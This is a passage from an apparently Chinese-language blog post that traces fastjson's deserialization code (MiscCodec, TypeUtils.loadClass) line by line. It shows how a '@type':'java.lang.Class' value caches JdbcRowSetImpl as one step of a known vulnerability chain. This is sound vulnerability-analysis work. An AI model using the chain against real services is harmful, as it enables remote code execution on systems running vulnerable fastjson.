<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ObjectDeserializer <span class="title function_">getDeserializer</span><span class="params">(Type type)</span> &#123;</span><br><span class="line">    <span class="type">ObjectDeserializer</span> <span class="variable">derializer</span> <span class="operator">=</span> <span class="built_in">this</span>.deserializers.get(type);</span><br><span class="line">    <span class="keyword">if</span> (derializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> derializer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>ParserConfig</code> 在构造函数中会调用 <code>initDeserializers</code> 函数初始化 <code>deserializers</code>，往里面预先添加一部分 Java 类型及其对应的反序列化器。其中我们传入的 <code>java.lang.Class</code> 对应的是 <code>com.alibaba.fastjson.serializer.MiscCodec</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MiscCodec</span> <span class="keyword">implements</span> <span class="title class_">ObjectSerializer</span>, ObjectDeserializer &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">MiscCodec</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MiscCodec</span>();</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initDeserializers</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p><code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> 函数的关键代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反序列化“杂项”类型的统一入口。这个反序列化器负责把“一个 JSON 值”</span></span><br><span class="line"><span class="comment"> * 转成很多常见的 Java 类型（Class、File、URI、URL、Locale、Pattern、</span></span><br><span class="line"><span class="comment"> * InetAddress、TimeZone、SimpleDateFormat、UUID、JSONPath、java.nio.file.Path 等），</span></span><br><span class="line"><span class="comment"> * 以及特殊对象结构（如 InetSocketAddress）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;核心语义&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 1) 普通情况：先把 JSON 解析成一个“原始值”（字符串或 JSONObject），</span></span><br><span class="line"><span class="comment"> *    再根据目标类型 clazz 做定制转换。</span></span><br><span class="line"><span class="comment"> * 2) 当上游刚解析过 &quot;<span class="doctag">@type</span>&quot; 并触发“类型名重定向”（resolveStatus=TypeNameRedirect）时，</span></span><br><span class="line"><span class="comment"> *    本方法会强制读取紧随其后的键 &quot;val&quot;，把它当作真正的值进行处理。</span></span><br><span class="line"><span class="comment"> *    典型格式：&#123;&quot;<span class="doctag">@type</span>&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;java.lang.String&quot;&#125;</span></span><br><span class="line"><span class="comment"> * 3) 当目标类型是 Class.class 时，会把字符串当“类全名”去加载，</span></span><br><span class="line"><span class="comment"> *    调用 TypeUtils.loadClass(String, ClassLoader)（双参重载）。</span></span><br><span class="line"><span class="comment"> *    按这些版本的实现，该重载内部会导致把类名写进全局缓存 TypeUtils.mappings（cache=true 语义），</span></span><br><span class="line"><span class="comment"> *    进而影响后续 checkAutoType() 的决策（命中缓存会提前返回）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;参数&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> parser    fastjson 的默认解析器，持有 lexer（词法分析器）、配置、状态机等</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz     目标 Java 类型（可能是 Class 对象，也可能是 ParameterizedType 等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fieldName 字段名（调用场景传入，用于错误定位或差异化处理，本方法基本不使用）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;返回&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 把当前输入（一个 JSON 值或对象）转换为类型 T 的实例；不符合期望时抛 JSONException。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;可能抛出&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * JSONException：当语法不符合期望、目标类型不受支持、或底层构造失败等。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;示例&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * - 目标类型 URL，JSON: &quot;https://example.com&quot; → new URL(&quot;https://example.com&quot;)</span></span><br><span class="line"><span class="comment"> * - 目标类型 InetSocketAddress，JSON: &#123;&quot;address&quot;:&quot;127.0.0.1&quot;,&quot;port&quot;:8080&#125;</span></span><br><span class="line"><span class="comment"> * - 目标类型 Class，resolveStatus=TypeNameRedirect 时：</span></span><br><span class="line"><span class="comment"> *   &#123;&quot;<span class="doctag">@type</span>&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;java.lang.String&quot;&#125; → String.class（并写入缓存）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">// 从 parser 拿到词法分析器：用于查看/推进当前 token</span></span><br><span class="line">    <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> parser.lexer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// =========================</span></span><br><span class="line">    <span class="comment">// 普通值解析（或者“类型名重定向”场景的后半段）</span></span><br><span class="line">    <span class="comment">// 先把“原始值”读出来，命名为 objVal</span></span><br><span class="line">    <span class="comment">// =========================</span></span><br><span class="line">    Object objVal;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【关键】当上游因为遇到 &quot;@type&quot; 把 resolveStatus 设为 TypeNameRedirect 时，</span></span><br><span class="line">    <span class="comment">// 这里按照“固定协议”读取紧随其后的 `&quot;val&quot;: &lt;真正的值&gt;`。</span></span><br><span class="line">    <span class="comment">// 典型用法：&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.xxx.YourClass&quot;&#125;</span></span><br><span class="line">    <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">        <span class="comment">// 这个状态只消费一次，用完即清</span></span><br><span class="line">        parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 期望一个逗号，把流从 &quot;@type&quot; 移到下一个键（通常是 &quot;val&quot;）</span></span><br><span class="line">        parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 强制要求接下来是字符串键名，且必须等于 &quot;val&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>); <span class="comment">// 不是 &quot;val&quot; 就报语法错</span></span><br><span class="line">            &#125;</span><br><span class="line">            lexer.nextToken(); <span class="comment">// 吃掉这个键名 token</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);     <span class="comment">// 不是字符串键名 → 报错</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 必须出现冒号 &#x27;:&#x27;</span></span><br><span class="line">        parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析 &quot;val&quot; 对应的值（可能是字符串、对象等）</span></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最后必须以 &#x27;&#125;&#x27; 结束这个对象</span></span><br><span class="line">        parser.accept(JSONToken.RBRACE);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 非 TypeNameRedirect：就按普通值解析一份</span></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// =========================</span></span><br><span class="line">    <span class="comment">// 把 objVal 规整为字符串（大多数目标类型从字符串构造）</span></span><br><span class="line">    <span class="comment">// =========================</span></span><br><span class="line">    String strVal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">        strVal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        strVal = (String) objVal;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果原始值是个 JSONObject，而且目标类型是某些特殊类型，就在这里“对象转对象”</span></span><br><span class="line">        <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> (JSONObject) objVal;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 特例 [...]</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 其他对象：交给 fastjson 的对象到 JavaBean 转换</span></span><br><span class="line">            <span class="keyword">return</span> jsonObject.toJavaObject(clazz);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 走到这里，既不是字符串也不是 JSONObject，以当前实现只接受字符串 → 报错</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;expect string&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// =========================</span></span><br><span class="line">    <span class="comment">// 【关键】当目标类型就是 Class.class：</span></span><br><span class="line">    <span class="comment">// 把 strVal 当作“类全名”去加载（例如 &quot;java.lang.String&quot; → String.class）</span></span><br><span class="line">    <span class="comment">// =========================</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">        <span class="comment">// 这里调用的是 TypeUtils.loadClass(String, ClassLoader) 双参重载。</span></span><br><span class="line">        <span class="comment">// 在这些 fastjson 版本中，该重载内部会以 cache=true 的方式去加载，</span></span><br><span class="line">        <span class="comment">// 从而把类名写入全局缓存 TypeUtils.mappings。</span></span><br><span class="line">        <span class="comment">// 这正是历史漏洞链里的“先写缓存”的关键一步。</span></span><br><span class="line">        <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>deserialze</code> 函数如果判断 <code>parser.resolveStatus</code> 为 <code>DefaultJSONParser.TypeNameRedirect</code> 那么会解析后面的 <code>val</code> 键对应的值到 <code>objVal</code>，这里也就是我们传入的 <code>com.sun.rowset.JdbcRowSetImpl</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Object objVal;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 【关键】当上游因为遇到 &quot;@type&quot; 把 resolveStatus 设为 TypeNameRedirect 时，</span></span><br><span class="line"><span class="comment">// 这里按照“固定协议”读取紧随其后的 `&quot;val&quot;: &lt;真正的值&gt;`。</span></span><br><span class="line"><span class="comment">// 典型用法：&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.xxx.YourClass&quot;&#125;</span></span><br><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">    <span class="comment">// 这个状态只消费一次，用完即清</span></span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 期望一个逗号，把流从 &quot;@type&quot; 移到下一个键（通常是 &quot;val&quot;）</span></span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 强制要求接下来是字符串键名，且必须等于 &quot;val&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>); <span class="comment">// 不是 &quot;val&quot; 就报语法错</span></span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken(); <span class="comment">// 吃掉这个键名 token</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);     <span class="comment">// 不是字符串键名 → 报错</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须出现冒号 &#x27;:&#x27;</span></span><br><span class="line">    parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析 &quot;val&quot; 对应的值（可能是字符串、对象等）</span></span><br><span class="line">    objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后必须以 &#x27;&#125;&#x27; 结束这个对象</span></span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>随后这个值会被解析为字符串 <code>strVal</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>当 <code>@type</code> 的值为 <code>java.lang.Class</code> 时会调用 <code>com.alibaba.fastjson.util.TypeUtils#loadClass</code> 加载类，其中参数 <code>className</code> 的值就是我们设置的 <code>com.sun.rowset.JdbcRowSetImpl</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// =========================</span></span><br><span class="line"><span class="comment">// 【关键】当目标类型就是 Class.class：</span></span><br><span class="line"><span class="comment">// 把 strVal 当作“类全名”去加载（例如 &quot;java.lang.String&quot; → String.class）</span></span><br><span class="line"><span class="comment">// =========================</span></span><br><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">    <span class="comment">// 这里调用的是 TypeUtils.loadClass(String, ClassLoader) 双参重载。</span></span><br><span class="line">    <span class="comment">// 在这些 fastjson 版本中，该重载内部会以 cache=true 的方式去加载，</span></span><br><span class="line">    <span class="comment">// 从而把类名写入全局缓存 TypeUtils.mappings。</span></span><br><span class="line">    <span class="comment">// 这正是历史漏洞链里的“先写缓存”的关键一步。</span></span><br><span class="line">    <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p><code>com.alibaba.fastjson.util.TypeUtils#loadClass</code> 函数逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据类名加载 Class，并可选择性地写入全局缓存 TypeUtils.mappings。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> className   类名；既可能是完全限定名（如 &quot;java.lang.String&quot;），</span></span><br><span class="line"><span class="comment"> *                    也可能是 JVM 描述符风格（如 &quot;[Ljava.lang.String;&quot; 或 &quot;Ljava.lang.String;&quot;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classLoader 优先使用的类加载器；为 null 时走 TCCL / Class.forName 兜底</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cache       是否把加载结果写入全局缓存 mappings（但最后一个分支会无视这个开关，见下）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="comment">// 1) 空字符串/空指针保护</span></span><br><span class="line">    <span class="keyword">if</span>(className == <span class="literal">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 先查全局缓存 TypeUtils.mappings（ConcurrentHashMap）</span></span><br><span class="line">    <span class="comment">//    命中则直接返回，避免重复加载</span></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 处理数组描述符（以 &#x27;[&#x27; 开头的 JVM 描述符）</span></span><br><span class="line">    <span class="comment">//    例如 &quot;[Ljava.lang.String;&quot;、&quot;[[I&quot; 等</span></span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">// 去掉一个 &#x27;[&#x27;，递归加载“组件类型”</span></span><br><span class="line">        <span class="comment">// 【注意】这里调用的是双参重载 loadClass(String, ClassLoader)，</span></span><br><span class="line">        <span class="comment">//         该重载内部会默认传 cache=true → 组件类型会被写入 mappings。</span></span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="comment">// 根据组件类型构造一个 0 长度数组的 Class 对象返回</span></span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 处理 &quot;L...;&quot; 的 JVM 描述符：去掉首尾的 &#x27;L&#x27; 和 &#x27;;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>))&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 同上，调用双参重载 → 默认 cache=true</span></span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// 5) 优先使用调用方提供的 classLoader</span></span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="comment">// 根据实参 cache 决定是否写入全局缓存</span></span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace(); <span class="comment">// 【注意】打印堆栈：可能造成日志噪音/信息泄露风险（生产环境通常不建议）</span></span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// 6) 退而求其次：使用当前线程的 ContextClassLoader（TCCL）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="comment">// 同样受 cache 参数控制是否写入 mappings</span></span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// 7) 最后兜底：使用 Class.forName</span></span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        <span class="comment">// 【关键】这里不看 cache 参数，**无条件**写入 mappings！</span></span><br><span class="line">        <span class="comment">//        → 即使调用方传 cache=false，这个分支仍会把类名放进全局缓存。</span></span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8) 若所有路径都失败，返回（此时为 null）</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先我们调用的 <code>loadClass(String className, ClassLoader classLoader)</code> 实际上是对 <code>loadClass(String className, ClassLoader classLoader, boolean cache)</code> 的一个封装，并且默认传入的 <code>cache</code> 值为 <code>true</code>。</p>
